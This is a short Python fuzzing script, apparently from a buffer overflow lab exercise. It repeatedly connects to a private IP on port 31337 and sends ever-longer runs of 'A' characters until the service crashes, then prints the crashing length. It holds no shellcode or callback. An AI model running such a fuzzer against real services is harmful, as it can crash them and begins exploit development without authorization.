#!/usr/bin/env python3

import socket, time, sys

ip = "172.20.192.1"

port = 31337
timeout = 5

string = "A" * 10

while True:
    
  payload = string + '\n'
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string)))
      s.send(bytes(payload, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string)))
    sys.exit(0)
  string += 10 * "A"
  time.sleep(1)



